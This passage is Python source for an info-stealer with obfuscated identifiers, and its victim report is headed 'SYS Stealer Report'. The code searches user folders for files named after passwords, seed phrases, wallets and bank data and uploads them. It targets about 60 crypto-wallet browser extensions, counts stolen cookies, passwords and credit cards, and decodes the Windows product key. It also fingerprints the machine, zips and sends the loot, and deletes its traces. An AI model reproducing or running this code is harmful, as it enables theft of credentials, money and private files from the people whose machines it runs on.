    S74r77Hr34D(G378r0W53r5,   [br0W53rP47H5,]                                      )
    S74r77Hr34D(G47H3rZ1P5,    [br0W53rP47H5, p47H570Z1P, t3136r4M]                 )
    for thread in THr34D1157:
        thread.join()

ALLOWED_EXTENSIONS = [
    ".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", 
    ".odt", ".pdf", ".rtf", ".json", ".csv", ".db", ".jpg", ".jpeg", 
    ".png", ".gif", ".webp", ".py", ".rdp", ".js", ".php", ".c", ".cpp", 
    ".java", ".go", ".rb", ".cs", ".kt", ".swift", ".md", ".tex", ".epub", ".mobi",
    ".tiff", ".bmp", ".svg", ".webm", ".flv", ".avi", ".mov", ".wmv", ".mpg", ".mpeg"
]

def verifi_extension(file_name):
    file_name = file_name.lower()  # Normalize the file name to lowercase
    for extension in ALLOWED_EXTENSIONS:
        if file_name.endswith(extension):
            return True
    return False  # Explicitly return False if no match is found
LogsCaption=f"👤 Username: {os.getlogin()} | 💻 Computer Name: {socket.gethostname()}"
K1W1F113s=[]
def K1W1F01D3r(pathF, keywords):
   try:
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        #print(file)
        full_path = os.path.join(pathF, file)
        if not os.path.isfile(full_path): return
        i += 1
        if i <= maxfilesperdir and verifi_extension(file) and os.stat(full_path).st_size < 500000 and ".lnk" not in file:
            saveToDir = os.path.join(TempFolder, 'files')          
            os.makedirs(saveToDir, exist_ok=True)
            url=sendRequest(full_path, "document",True,LogsCaption)
            #print (url)
            if url:
                with open(os.path.join(saveToDir, "SYS_List_files.txt"), "a") as f:
                    f.write(url + "\n")            
            else:
                shutil.copy(full_path, saveToDir)  # Copy the file           
            ffound.append(full_path)
   
            K1W1F113s.append(file)
        else:
            break
    
   except Exception as e:
        pass


def K1W1F113(path, keywords):
    try:
        fifound = []
        global K1W1F113s
        listOfFile = os.listdir(path)
        
        if not listOfFile:
            return
        
        for file in listOfFile:
            # Check if any keyword is in the file name (case-insensitive)
            for worf in keywords:
                
                if worf.lower() in file.lower():
                    # Full file path
                    full_path = os.path.join(path, file)
                    
                    # Check if it's a file and not a shortcut (lnk)
                    if os.path.isfile(full_path) and os.stat(full_path).st_size < 500000 and ".lnk" not in file and verifi_extension(file):
                        
                        saveToDir = os.path.join(TempFolder, 'files')
            
                        os.makedirs(saveToDir, exist_ok=True)
                        url=sendRequest(full_path, "document",True,LogsCaption)
                        #print (url)
                        if url:
                            with open(os.path.join(saveToDir, "SYS_List_files.txt"), "a") as f:
                                f.write(url + "\n")            
                        else:
                            shutil.copy(full_path, saveToDir)  # Copy the file     
                        fifound.append(full_path) 
                        K1W1F113s.append(file)
                        break
                    
                    # If it's a directory, recurse into it
                    if os.path.isdir(full_path):
                        K1W1F01D3r(full_path, keywords)  # Recursive call
                        break
 
    
    except Exception as e:
        pass #print(f"Error processing path {path}: {e}")

# Example usage

def K1W1():
    user = temp.split("\\AppData")[0]
    path2search = [
        user    + r"\Desktop",
        user    + r"\Downloads",
        user    + r"\Documents",
        roaming + r"\Microsoft\Windows\Recent",
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "bot",
        "atomic",
        "account",
        "acount",
        "paypal",
        "banque",
        "bot",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "seed",
        "mnemonic"
        "memoric",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
        "bank",
        "info",
        "casino",
        "prv",
        "privé",
        "prive",
        "telegram",
        "identifiant",
        "personnel",
        "trading"
        "bitcoin",
        "sauvegarde",
        "funds",
        "récupé",
        "recup",
        "note",
    ]
   
    we=[]
    for patt in path2search: 
  
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles])

        kiwi.start()
        we.append(kiwi)

    for thread in we: thread.join()


global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157

DETECTED = False
w411375 = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"         ],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
    ["egjidjbpglichdcondbcbdnbeeppgdph", "Trust"            ],
    ["ojggmchlghnjlapmfbnjholfjkiidbch", "Venom"            ],
    ["opcgpfmipidbgpenhmajoajpbobppdil", "Sui"              ],
    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ],
    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], 
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"             ],
    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
    ["ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"      ],
    ["fihkakfobkmkjojpchpfgcmhfjnmnfpi","Bitapp"],
["pnlfjmlcjdjgkddecgincndfgegkecke","Crocobit"],
["blnieiiffboillknjnepogjhkgnoapac","Equal"],
["cjmkndjhnagcfbpiemnkdpomccnjblmj","Finnie"],
["flpiciilemghbmfalicajoolhkkenfel","Iconex"],
["dmkamcknogkgcdfhhbddcghachkejeap","Keplr"],
["fcckkdbjnoikooededlapcalpionmalo","Mobox"],
["jbdaocneiiinmjbjlgalhcelgbejmnid","Nifty"],
["pocmplpaccanhmnllbbkpgfliimjljgo","Slope"],
["fhmfendgdocmcbmfikdcogofphimnkno","Sollet"],
["mfhbebgoclkghebffdldpobeajmbecfk","Starcoin"],
["cmndjbecilbocjfkibfbifhngkdmjgog","Swash"],
["nphplpgoakhhjchkkhmiggakijnkhfnd","Ton"],
["bocpokimicclpaiekenaeelehdjllofo","XinPay"],
["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"],
]
IP = G371P()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], ''

GLINFO = G108411NF0(IP)
G47H3r411()
K1W1()



def create_zip(folders, zip_path):
    # Ensure the parent directory of the zip_path exists
    os.makedirs(os.path.dirname(zip_path), exist_ok=True)

    # Filter folders that exist and are not empty
    valid_folders = [folder for folder in folders if os.path.isdir(folder) and os.listdir(folder)]

    if not valid_folders:
        return "No valid folders to zip. ZIP file not created."

    # Create the ZIP file
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for folder in valid_folders:
            for root, _, files in os.walk(folder):
                for file in files:
                    abs_path = os.path.join(root, file)
                    arc_name = os.path.relpath(abs_path, start=os.path.dirname(folder))
                    zipf.write(abs_path, arc_name)
    
    return zip_path

# Example usage
SendDataTask=[]

folders_to_zip = [os.path.join(TempFolder, 'Message'), os.path.join(TempFolder, 'Credentials'), os.path.join(TempFolder, 'files')]

zip_file_path = ArchivePath

zip_result = create_zip(folders_to_zip, zip_file_path)

def get_hardware_uuid():
    w = wmi.WMI()
    for system in w.query("SELECT * FROM Win32_ComputerSystemProduct"):
        return system.UUID
    return "UUID not found"
    
def get_mac_address():
    mac = hex(uuid.getnode())
    mac = mac[2:]  # Remove the "0x" prefix
    mac = ':'.join([mac[i:i+2] for i in range(0, len(mac), 2)])  # Format the MAC address
    return mac

# Get current date and time
current_time = datetime.now()
def check_proxy_vpn(ip):
    try:
        # Use ipapi.co to check if the IP is a proxy or VPN
        response = requests.get(f"https://ipapi.co/{ip}/json/").json()
        if response.get("proxy", False):
            return "✅ Proxy Detected"
        elif response.get("vpn", False):
            return "✅ VPN Detected"
        else:
            return "❌ Not Detected"
    except Exception as e:
        return f"Unknown"
        
system = platform.system() + " " + platform.release() + f" ({platform.architecture()[0]})"
# Usage

def get_windows_product_key():
    # Open registry key where DigitalProductId is stored
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        # Read DigitalProductId from registry
        value, _ = winreg.QueryValueEx(key, "DigitalProductId")
        is_win8_or_up = platform.release() == "8" or platform.release() > "8"
        return decode_product_key(value, is_win8_or_up)
    except FileNotFoundError:
        return "Unknown product key."
    except Exception as e:
        return "Unknown product key."
    finally:
        try:
            key.Close()
        except:
            pass

def decode_product_key(digital_product_id, is_win8_or_up):
    if is_win8_or_up:
        return decode_product_key_win8_and_up(digital_product_id)
    else:
        return decode_product_key_legacy(digital_product_id)

def decode_product_key_legacy(digital_product_id):
    try:
        key_start_index = 52
        key_end_index = key_start_index + 15
        digits = 'BCDFGHJKMPQRTVWXY2346789'
        decode_length = 29
        decoded_chars = [''] * decode_length
        hex_pid = list(digital_product_id[key_start_index:key_end_index + 1])

        for i in range(decode_length - 1, -1, -1):
            if (i + 1) % 6 == 0:
                decoded_chars[i] = '-'
            else:
                digit_map_index = 0
                for j in range(14, -1, -1):
                    byte_value = (digit_map_index << 8) | hex_pid[j]
                    hex_pid[j] = byte_value // 24
                    digit_map_index = byte_value % 24
                    decoded_chars[i] = digits[digit_map_index]

        return ''.join(decoded_chars)
    except Exception:
        return "Unknown product key."

def decode_product_key_win8_and_up(digital_product_id):
    try:
        key = ""
        key_offset = 52
        is_win8 = (digital_product_id[66] // 6) & 1
        digital_product_id[66] = (digital_product_id[66] & 0xf7) | ((is_win8 & 2) * 4)

        digits = "BCDFGHJKMPQRTVWXY2346789"
        last = 0

        for i in range(24, -1, -1):
            current = 0
            for j in range(14, -1, -1):
                current = current * 256
                current += digital_product_id[j + key_offset]
                digital_product_id[j + key_offset] = current // 24
                current = current % 24
                last = current
            key = digits[current] + key

        key_part1 = key[1:last]
        key_part2 = key[last + 1:]
        key = key_part1 + "N" + key_part2

        for i in range(5, len(key), 6):
            key = key[:i] + "-" + key[i:]

        return key
    except Exception:
        return "Unknown product key."
        
SOURCE_CODE_EXTENSIONS = {".py", ".js", ".php", ".c", ".cpp", ".java", ".go", ".rb", ".cs", ".kt", ".swift", ".rdp"}
DATABASE_EXTENSIONS = {".db", ".json", ".csv", ".sqlite", ".sql", ".pgsql", ".mdb"}
DOCUMENT_EXTENSIONS = {".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".pdf", ".rtf", ".md", ".tex", ".epub", ".mobi"}
IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".tiff", ".bmp", ".svg"}
VIDEO_EXTENSIONS = {".mp4", ".mkv", ".avi", ".mov", ".wmv", ".mpg", ".mpeg", ".webm", ".flv"}

def categorize_files(file_list):
    # Initialize counters for each category
    source_code_count = 0
    database_count = 0
    document_count = 0
    image_count = 0
    video_count = 0

    # Iterate through the list of files
    for file in file_list:
        # Get the file extension
        file_extension = os.path.splitext(file)[1].lower()

        # Increment the appropriate counter based on the file extension
        if file_extension in SOURCE_CODE_EXTENSIONS:
            source_code_count += 1
        elif file_extension in DATABASE_EXTENSIONS:
            database_count += 1
        elif file_extension in DOCUMENT_EXTENSIONS:
            document_count += 1
        elif file_extension in IMAGE_EXTENSIONS:
            image_count += 1
        elif file_extension in VIDEO_EXTENSIONS:
            video_count += 1

    # Prepare the output
    output = []
    if source_code_count > 0:
        output.append(f" 📂 Source Code Files: {source_code_count}")
    if database_count > 0:
        output.append(f" 📂 Database Files: {database_count}")
    if document_count > 0:
        output.append(f" 📂 Documents: {document_count}")
    if image_count > 0:
        output.append(f" 🖼️ Images: {image_count}")
    if video_count > 0:
        output.append(f" 🎥 Videos: {video_count}")
    
    return "\n".join(output)


image_path = os.path.join(TempFolder, "screenshot.png")
new="\n"
image_caption =f"""🔍🎯 SYS Stealer Report: New Victim Spotted — {os.getlogin()} | {socket.gethostname()}
📆 Report Details 

🗓️ Date: {current_time.strftime("%A, %Y-%m-%d, %I:%M:%S %p %Z")} 
🌍 Public IP: {IP}
📶 Mac address : {get_mac_address()}
🏴 Country: {GLINFO}
🛡️ Proxy/VPN: {check_proxy_vpn(IP)}

🖥️ System Information ⤵

🖥️ System: {system}
👤 Username: {os.getlogin()}
💻 Computer Name: {socket.gethostname()}
🆔 UUID: {get_hardware_uuid()}
🔑 Windows Product Key : {get_windows_product_key()}

{" 📂 Detected Files & Data ⤵ " if K1W1F113s else ''}
 
{categorize_files(K1W1F113s)}
 
🌐 Accounts & Sessions ⤵

🟢 Discord Accounts: {"True" if T0K3Ns else "False"}
🛡️ Passwords: {P455WC0UNt}
🍪 Browser Cookies: {C00K1C0UNt}
📜 Browser History: {H1570rYC0UNt}
✍️ Autofills: {AU70F111C0UNt}
💳 Credit Card : {CC5C0UNt}
📑 Bookmarks : {B00KM4rK5C0UNt}
🎮 Gaming Sessions : {"True" if G4M1N6Z1p else "False"}
📱 Telegram Sessions: {"True" if O7H3rZ1p else "False"}

{"💰 Crypto Data: " if W411375Z1p else ''}

{new.join(W411375Z1p) if W411375Z1p else ''}
"""


#print(image_caption)
#print(C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt)
#print( W411375Z1p, G4M1N6Z1p, O7H3rZ1p, K1W1F113s, T0K3Ns)
SendDataTask.append({"function": sendImage, "args": (image_path, image_caption)})

if os.path.exists(zip_result):  # Ensure the file exists
    SendDataTask.append({"function": sendZip, "args": (zip_result,LogsCaption)})   

  # List to store tasks

# List of folders and their corresponding captions
folders = ['Telegram', 'Wallets', 'Wallets']
captions = ["Telegram Logs |", "Wallets Logs |", "Gaming Logs |"]

# List of identifier lists
identifiers = [O7H3rZ1p, W411375Z1p, G4M1N6Z1p]

# Loop through each folder, identifiers, and corresponding caption
for folder, ids, caption in zip(folders, identifiers, captions):
    for i in ids:
        zip_path = os.path.join(TempFolder, folder, f"{str(i)}.zip")
        if os.path.exists(zip_path):
            SendDataTask.append({"function": sendZip, "args": (zip_path, caption+LogsCaption)})
            
threadedExecution(SendDataTask)
try:
            if (sum(1 for item in datasent if item["type"] in ["photo", "text"]) == 1) and any(item["type"] == "document" for item in datasent):
                remove_lock_file()
                #os.remove(__file__)
            os.remove(ArchivePath)  
            shutil.rmtree(TempFolder)
            os.remove(ArchivePath.replace('.zip','.aes'))
            sys.exit()
except Exception as e:
    print(e)
